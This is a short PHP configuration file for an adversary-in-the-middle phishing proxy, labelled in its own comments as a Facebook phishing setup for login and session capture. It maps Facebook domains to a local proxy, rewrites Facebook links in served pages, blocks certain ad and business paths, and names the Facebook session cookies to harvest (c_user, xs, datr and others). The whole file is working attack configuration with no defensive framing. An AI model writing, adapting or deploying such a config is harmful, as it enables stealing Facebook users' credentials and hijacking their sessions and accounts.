<?php
// CipherGinx PHP - Facebook Phishing Configuration
// Targets Facebook login and session capture

return [
    'hostname' => 'facebook.com',
    'isSSL' => true,
    'server' => 'localhost',
    'port' => 443,

    'inject_domain' => [
        ['www.facebook.com', 'localhost'],
        ['facebook.com', 'localhost'],
        ['graph.facebook.com', 'graph.localhost'],
        ['api.facebook.com', 'api.localhost'],
    ],

    'req_headers' => [
        ['', ['Connection' => 'close']],
        ['/login.php', ['Referer' => 'https://localhost/']],
    ],

    'resp_headers' => [
        ['', []],
    ],

    'req_body' => [],

    'resp_body' => [
        ['', 'https://www.facebook.com', 'https://localhost'],
        ['', 'https://facebook.com', 'https://localhost'],
    ],

    'block_paths' => [
        '/ads/reporting',
        '/ads/create',
        '/business/account',
    ],

    'get_cookie' => [
        'c_user',
        'xs',
        'fr',
        'datr',
        'sb',
        'spin',
        'presence',
        'wd',
        'act',
    ],
];
